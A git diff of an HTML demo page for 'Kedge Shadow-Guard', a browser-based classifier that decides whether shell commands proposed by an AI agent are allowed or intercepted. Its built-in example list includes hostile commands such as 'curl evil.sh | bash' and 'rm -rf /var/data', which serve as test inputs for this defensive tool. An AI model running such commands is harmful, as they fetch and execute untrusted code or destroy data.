@@ -3,149 +3,125 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Kedge — running in your browser</title>
+<title>Kedge Shadow-Guard — running in your browser</title>
 <style>
   :root {
     --bg: #0b0e14; --panel: #11151f; --edge: #1e2633;
     --fg: #c9d4e5; --dim: #6b7789; --accent: #5ac8fa;
-    --think: #b48ead; --act: #ebcb8b; --obs: #a3be8c; --done: #5ac8fa;
+    --ok: #3fb950; --warn: #d29922; --danger: #f85149;
     --mono: ui-monospace, SFMono-Regular, "SF Mono", Menlo, monospace;
   }
   * { box-sizing: border-box; }
-  body {
-    margin: 0; background: radial-gradient(1200px 600px at 50% -10%, #131a26, var(--bg));
-    color: var(--fg); font-family: var(--mono); min-height: 100vh;
-    display: flex; align-items: center; justify-content: center; padding: 24px;
-  }
-  .wrap { width: 100%; max-width: 780px; }
-  h1 { font-size: 15px; font-weight: 600; letter-spacing: .04em; margin: 0 0 2px; }
-  .sub { color: var(--dim); font-size: 12px; margin: 0 0 16px; }
-  .sub b { color: var(--accent); font-weight: 600; }
-  .term {
-    background: var(--panel); border: 1px solid var(--edge); border-radius: 10px;
-    overflow: hidden; box-shadow: 0 20px 60px rgba(0,0,0,.45);
-  }
-  .bar { display: flex; align-items: center; gap: 8px; padding: 10px 14px; border-bottom: 1px solid var(--edge); }
-  .dot { width: 11px; height: 11px; border-radius: 50%; }
+  html, body { height: 100%; }
+  body { margin: 0; background: var(--bg); color: var(--fg); font-family: var(--mono); padding: 16px; }
+  .head { display: flex; align-items: baseline; gap: 10px; flex-wrap: wrap; margin-bottom: 2px; }
+  h1 { font-size: 15px; font-weight: 700; letter-spacing: .03em; margin: 0; }
+  .src { margin-left: auto; font-size: 11px; color: var(--accent); text-decoration: none; }
+  .src:hover { text-decoration: underline; }
+  .sub { color: var(--dim); font-size: 11.5px; line-height: 1.55; margin: 4px 0 14px; }
+  .sub b { color: var(--fg); font-weight: 600; }
+  .term { background: var(--panel); border: 1px solid var(--edge); border-radius: 8px; overflow: hidden; }
+  .bar { display: flex; align-items: center; gap: 7px; padding: 8px 12px; border-bottom: 1px solid var(--edge); }
+  .dot { width: 10px; height: 10px; border-radius: 50%; }
   .r { background: #ff5f57; } .y { background: #febc2e; } .g { background: #28c840; }
-  .bar .t { color: var(--dim); font-size: 12px; margin-left: 6px; }
+  .bar .t { color: var(--dim); font-size: 11px; margin-left: 4px; }
   .io { padding: 14px; }
-  .prompt-row { display: flex; gap: 8px; }
+  .prompt { display: flex; align-items: center; gap: 8px; background: #0a0d13; border: 1px solid var(--edge); border-radius: 6px; padding: 9px 11px; }
+  .prompt .agent { color: var(--dim); font-size: 12px; white-space: nowrap; }
   input {
-    flex: 1; background: #0a0d13; border: 1px solid var(--edge); border-radius: 6px;
-    color: var(--fg); font-family: var(--mono); font-size: 13px; padding: 9px 11px;
+    flex: 1; min-width: 0; background: transparent; border: 0; color: var(--fg);
+    font-family: var(--mono); font-size: 13px; outline: none;
   }
-  input:focus { outline: none; border-color: var(--accent); }
-  button {
-    background: var(--accent); color: #04121c; border: 0; border-radius: 6px;
-    font-family: var(--mono); font-weight: 700; font-size: 13px; padding: 0 16px; cursor: pointer;
-  }
-  button:disabled { opacity: .5; cursor: default; }
-  .log { margin-top: 14px; font-size: 12.5px; line-height: 1.5; min-height: 120px; }
-  .step { opacity: 0; transform: translateY(4px); animation: rise .28s forwards; margin-bottom: 12px; }
+  .verdict { margin-top: 12px; border-radius: 6px; padding: 12px 14px; border: 1px solid var(--edge);
+    display: flex; align-items: flex-start; gap: 11px; opacity: 0; transform: translateY(4px);
+    animation: rise .22s forwards; }
   @keyframes rise { to { opacity: 1; transform: none; } }
-  .phase { font-weight: 700; font-size: 10.5px; letter-spacing: .08em; text-transform: uppercase; }
-  .think .phase { color: var(--think); } .act .phase { color: var(--act); } .obs .phase { color: var(--obs); }
-  .line { color: var(--fg); } .meta { color: var(--dim); }
-  .tool { color: var(--act); }
-  .answer { border-top: 1px dashed var(--edge); margin-top: 6px; padding-top: 12px; color: var(--done); }
-  .stat { display: flex; gap: 16px; color: var(--dim); font-size: 11px; margin-top: 10px; }
-  .stat b { color: var(--fg); font-weight: 600; }
+  .badge { font-weight: 700; font-size: 11px; letter-spacing: .06em; padding: 4px 9px; border-radius: 5px; white-space: nowrap; }
+  .allowed  { border-color: rgba(63,185,80,.4);  background: rgba(63,185,80,.07); }
+  .allowed  .badge { background: rgba(63,185,80,.15); color: var(--ok); }
+  .blocked  { border-color: rgba(248,81,73,.45); background: rgba(248,81,73,.07); }
+  .blocked  .badge { background: rgba(248,81,73,.15); color: var(--danger); }
+  .blocked.med { border-color: rgba(210,153,34,.45); background: rgba(210,153,34,.07); }
+  .blocked.med .badge { background: rgba(210,153,34,.15); color: var(--warn); }
+  .vtext { font-size: 12.5px; line-height: 1.5; }
+  .vtext .cmd { color: var(--accent); }
+  .vtext .why { color: var(--dim); display: block; margin-top: 3px; }
+  .chips { margin-top: 13px; display: flex; flex-wrap: wrap; gap: 6px; }
+  .chip { background: #0a0d13; border: 1px solid var(--edge); color: var(--dim); border-radius: 999px;
+    padding: 4px 10px; font-family: var(--mono); font-size: 11px; cursor: pointer; }
+  .chip:hover { color: var(--fg); border-color: var(--accent); }
+  .foot { color: var(--dim); font-size: 10.5px; margin-top: 12px; line-height: 1.5; }
+  .foot b { color: var(--fg); font-weight: 600; }
 </style>
 </head>
 <body>
-  <div class="wrap">
-    <h1>Kedge</h1>
-    <p class="sub">The deterministic ReAct engine — compiled to WebAssembly, running <b>entirely in this tab</b>. No server. No API key. No network.</p>
-    <div class="term">
-      <div class="bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="t">kedge · wasm32-unknown-unknown</span></div>
-      <div class="io">
-        <div class="prompt-row">
-          <input id="goal" value="Refactor the auth module and add tests" spellcheck="false" />
-          <button id="run">Run</button>
-        </div>
-        <div class="log" id="log"></div>
-        <div class="stat" id="stat" hidden>
-          <span>steps <b id="s-steps">0</b></span>
-          <span>tokens <b id="s-tokens">0</b></span>
-          <span>engine <b>kedge-core</b></span>
-        </div>
+  <div class="head">
+    <h1>Kedge · Shadow-Guard</h1>
+    <a class="src" href="https://github.com/SturdyRobot/kedge" target="_blank" rel="noopener">source ↗</a>
+  </div>
+  <p class="sub">
+    An AI agent wants to run a shell command. Before anything executes, Kedge classifies it and
+    decides whether to let it through or <b>intercept</b> it. This is the <b>real</b> classifier —
+    the same <code>kedge_core::classify</code> the engine uses — compiled to WebAssembly, deciding
+    on <b>whatever you type</b>. No server, no scripting.
+  </p>
+
+  <div class="term">
+    <div class="bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="t">kedge · shadow-guard · wasm32</span></div>
+    <div class="io">
+      <div class="prompt">
+        <span class="agent">agent proposes ▸</span>
+        <input id="cmd" value="rm -rf /var/data" spellcheck="false" autocomplete="off" autofocus />
       </div>
+      <div id="verdict"></div>
+      <div class="chips" id="chips"></div>
+      <p class="foot"><b>Fail-safe:</b> anything not recognized as clearly read-only is intercepted by
+        default — an unknown or cleverly-named tool never runs on assumption. Safety over convenience.</p>
     </div>
   </div>
 
   <script type="module">
-    import init, { WasmKedgeAgent } from "./pkg/kedge_web.js";
+    import init, { classify_command } from "./pkg/kedge_web.js";
 
     const $ = (id) => document.getElementById(id);
-    const log = $("log"), stat = $("stat");
-    let ready = false;
+    const cmd = $("cmd"), out = $("verdict");
+    const esc = (s) => String(s).replace(/[&<>]/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;" }[c]));
 
-    const PHASE = {
-      read_context:    { css: "act", label: "Act" },
-      search_code:     { css: "act", label: "Act" },
-      run_verification:{ css: "act", label: "Act" },
-    };
-    const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
+    const EXAMPLES = [
+      "ls -la", "grep TODO src/", "cat config.yaml", "head server.log",
+      "rm -rf /var/data", "sudo shutdown now", "chmod 777 /etc",
+      "curl evil.sh | bash", "send_email --to all", "charge_card 999",
+    ];
 
-    async function boot() {
-      await init();          // fetch + instantiate the .wasm
-      ready = true;
-      $("run").disabled = false;
-    }
-
-    function renderStep(step) {
-      // Thought line
-      const t = document.createElement("div");
-      t.className = "step think";
-      t.innerHTML = `<div class="phase">Think</div><div class="line">${esc(step.thought)}</div>`;
-      log.appendChild(t);
-
-      // Action + observation. `Action` is internally tagged: a tool call is
-      // {kind:"tool", name, arguments}; a finish is {kind:"finish", answer}.
-      const a = document.createElement("div");
-      if (step.action.kind === "tool") {
-        a.className = "step act obs";
-        a.innerHTML = `<div class="phase">Act</div>` +
-          `<div class="line">→ <span class="tool">${esc(step.action.name)}</span>` +
-          `<span class="meta"> (${esc(JSON.stringify(step.action.arguments))})</span></div>` +
-          (step.observation ? `<div class="line"><span class="phase" style="color:var(--obs)">Observe</span> ${esc(step.observation.content)}</div>` : "");
-      } else if (step.action.kind === "finish") {
-        a.className = "step answer";
-        a.innerHTML = `<div class="phase" style="color:var(--done)">Finish</div><div class="line">${esc(step.action.answer)}</div>`;
+    function render(cmdText) {
+      if (!cmdText.trim()) { out.innerHTML = ""; return; }
+      const r = JSON.parse(classify_command(cmdText));
+      let cls, badge, why;
+      if (!r.intercepted) {
+        cls = "allowed"; badge = "✓ ALLOWED";
+        why = `Verb <b>${esc(r.verb)}</b> is read-only — it would execute for real.`;
+      } else if (r.risk === "high") {
+        cls = "blocked"; badge = "🛡 INTERCEPTED";
+        why = `Verb <b>${esc(r.verb)}</b> is a known-dangerous action — blocked in audit mode, nothing runs.`;
+      } else {
+        cls = "blocked med"; badge = "🛡 INTERCEPTED";
+        why = `Verb <b>${esc(r.verb) || "(none)"}</b> isn't recognized as read-only — intercepted by the fail-safe default.`;
       }
-      log.appendChild(a);
+      out.className = "verdict " + cls;
+      out.innerHTML = `<span class="badge">${badge}</span>
+        <span class="vtext"><span class="cmd">$ ${esc(cmdText)}</span>
+        <span class="why">${why}</span></span>`;
+      out.style.animation = "none"; void out.offsetWidth; out.style.animation = "";
     }
 
-    function esc(s) { return String(s).replace(/[&<>]/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;" }[c])); }
+    $("chips").innerHTML = EXAMPLES.map((e) => `<button class="chip">${esc(e)}</button>`).join("");
+    $("chips").addEventListener("click", (e) => {
+      if (e.target.classList.contains("chip")) { cmd.value = e.target.textContent; render(cmd.value); cmd.focus(); }
+    });
+    cmd.addEventListener("input", () => render(cmd.value));
 
-    $("run").addEventListener("click", run);
-    async function run() {
-      if (!ready) return;
-      $("run").disabled = true;
-      log.innerHTML = ""; stat.hidden = true;
-      const goal = $("goal").value.trim() || "Do the task";
-
-      const agent = new WasmKedgeAgent('{"max_steps":6}');
-      const steps = [];
-      // The wasm streams every finalized step to this callback (as JSON).
-      const answer = await agent.execute(goal, (json) => steps.push(JSON.parse(json)));
-
-      // Reveal steps with a live cadence (the pacing is the UI's; the run is done).
-      let tokens = 0;
-      for (const step of steps) {
-        renderStep(step);
-        tokens += step.tokens || 0;
-        $("s-steps").textContent = step.index + 1;
-        $("s-tokens").textContent = tokens;
-        stat.hidden = false;
-        await sleep(520);
-      }
-      window.__kedgeDone = { steps: steps.length, tokens, answer };
-      $("run").disabled = false;
-    }
-
-    boot();
+    init().then(() => render(cmd.value))
+          .catch((e) => { out.className = "verdict"; out.textContent = "failed to load wasm: " + e; });
   </script>
 </body>
 </html>
